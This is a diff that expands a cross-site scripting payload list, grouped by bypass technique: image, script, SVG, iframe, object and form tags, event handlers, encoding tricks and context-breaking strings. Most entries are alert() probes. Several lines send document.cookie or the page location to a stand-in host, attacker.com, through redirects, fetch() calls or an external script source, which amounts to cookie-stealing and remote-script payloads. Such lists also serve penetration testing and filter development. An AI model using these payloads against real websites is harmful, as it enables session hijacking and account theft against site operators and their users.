@@ -1,18 +1,124 @@
+# Advanced XSS Payloads - Curated and Optimized
+# Each payload is unique and targets different bypass techniques
+
+# ===== Image Tag Variations =====
 <IMG SRC=`javascript:alert('XSS')`>
 <IMG SRC=# onmouseover="alert('XSS')">
 <IMG SRC= onmouseover="alert('XSS')">
+<IMG SRC=x onerror=alert(1)>
+<IMG SRC=x onerror="alert('XSS')">
+<IMG SRC="javascript:alert('XSS')">
+<IMG SRC=`javascript:alert("XSS")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="javascript:alert`1`">
+<IMG SRC=javascript:alert(document.cookie)>
+<IMG SRC=javascript:alert(1)//>
+<IMG SRC=javascript:alert(1)<!-->
+
+# ===== Script Tag Variations =====
 <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>document.cookie="xss=1";</script>
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<script>fetch('https://attacker.com?d='+document.domain)</script>
+<script src="https://attacker.com/xss.js"></script>
+"><script>alert(1)</script>
+"></title><script>alert(1)</script>
+';alert(1)//
+
+# ===== SVG-Based Attacks =====
+<svg onload="alert('XSS')"></svg>
+<svg onload=alert(1)></svg>
+<svg onload=alert(document.cookie)></svg>
+<svg><script>alert(1)</script></svg>
+<svg><g onload=alert(1)></g></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+"><svg onload=alert(1)>
+
+# ===== Body/DOM Event Handlers =====
 <BODY ONLOAD=alert('XSS')>
-<img src=x onerror=alert(1)>
-<img src=x onerror="alert('XSS')">
+<body onload="alert('XSS')">
+<body onload="fetch('https://attacker.com?l='+location)">
+<body onload=fetch('https://attacker.com?l='+location)></body>
+"><body onload=alert(1)>
+
+# ===== Interactive Elements =====
 <div onmouseover=alert('XSS')>Hover me!</div>
 <a href="javascript:alert(1)">Click me</a>
+<a href="javascript:alert(document.cookie)">Click</a>
+<a href="javascript:alert(document.domain)">Click me</a>
+<button onclick="alert(1)">Click</button>
 <input type="text" value="XSS" onfocus="alert(1)">
-<body onload="alert('XSS')">
-<svg onload="alert('XSS')"></svg>
+<input type="button" value="Click me" onclick="alert('XSS')">
+<input type="text" onfocus="alert('XSS')" value="Focus me">
+<textarea><script>alert('XSS')</script></textarea>
+<x onmouseover=alert(1)>Hover</x>
+<x onmouseover=alert(document.domain)>Hover</x>
+
+# ===== Marquee and Audio Tags =====
 <marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<marquee onstart=alert(1)>XSS</marquee>
 <audio src onerror=alert('XSS')></audio>
+<video poster=1 onerror="alert(document.cookie)"></video>
+
+# ===== IFrame-Based Attacks =====
 <iframe src="javascript:alert(1)"></iframe>
+<iframe src="javascript:alert('XSS')"></iframe>
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<iframe src=javascript:alert(1)></iframe>
+<iframe src="https://attacker.com?c="+document.cookie></iframe>
+"><iframe src=javascript:alert(1)>
+
+# ===== Details and Other HTML5 Elements =====
+<details open ontoggle=alert(1)></details>
+<div onpointerenter=alert(1)>Hover me</div>
+
+# ===== Object and Embed Tags =====
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<object data="javascript:alert(document.cookie)"></object>
+<embed src="javascript:alert(document.cookie)">
+
+# ===== Input Value Exploits =====
+<input value="<img src=x onerror=alert(1)>">
+<input value="<script>alert('XSS')</script>">
+<input value='"><script>alert(1)</script>'>
+<input value='"><img src=x onerror=alert(1)>'>
+
+# ===== Form-Based Exploits =====
+<form><button formaction="javascript:alert('XSS')">Click me</button></form>
+<form><input type="hidden" name="xss" value="<script>alert('XSS')</script>"></form>
+<form><input name="xss" value="<img src=x onerror=alert('XSS')>"></form>
+
+# ===== Context Breaking =====
+"><img src=x onerror=alert(1)>
+"><img src=x onerror=alert('XSS')>
+'><script>alert('XSS')</script>
+"><img src="x" onerror="alert(document.cookie)">
+"><img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+
+# ===== DOM-Based XSS =====
+<img src="x" onerror="alert('DOM XSS')">
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<svg onload="fetch('https://attacker.com?d='+document.domain)"></svg>
+<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)">
+<img src=x onerror=alert(location)>
+<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
+
+# ===== Special Characters and Encoding =====
+<script>alert(String.fromCharCode(88,83,83))</script>
+javascript:alert(1)
+javascript:alert('XSS')
 
 <img src=x onerror=alert(1)>
 <img src=x onerror="alert('XSS')">
